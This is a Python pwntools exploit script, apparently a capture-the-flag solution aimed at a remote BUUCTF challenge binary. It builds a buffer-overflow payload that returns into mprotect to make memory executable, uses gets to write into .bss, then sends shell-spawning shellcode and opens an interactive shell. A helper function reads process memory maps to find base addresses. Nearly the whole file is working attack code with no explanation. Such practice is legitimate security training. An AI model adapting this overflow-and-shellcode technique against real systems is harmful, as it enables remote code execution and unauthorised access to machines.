#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

# io = process('./pwn')
io = remote('node2.buuoj.cn.wetolink.com', 28428)
elf = ELF('./pwn')

mpro = elf.sym['mprotect']
padding = 'a' * 0x2d
payload = padding + p32(mpro) + p32(elf.sym['main'])

payload += p32(0x80eb000) + p32(0x1000) + p32(7)
raw_input('mprotect')
io.sendline(payload)

payload = padding + p32(elf.sym['gets']) + p32(elf.bss())
payload += p32(elf.bss())
raw_input('gets')
io.sendline(payload)

raw_input('shellcode')
io.sendline(asm(shellcraft.sh()))

io.interactive()
io.close()

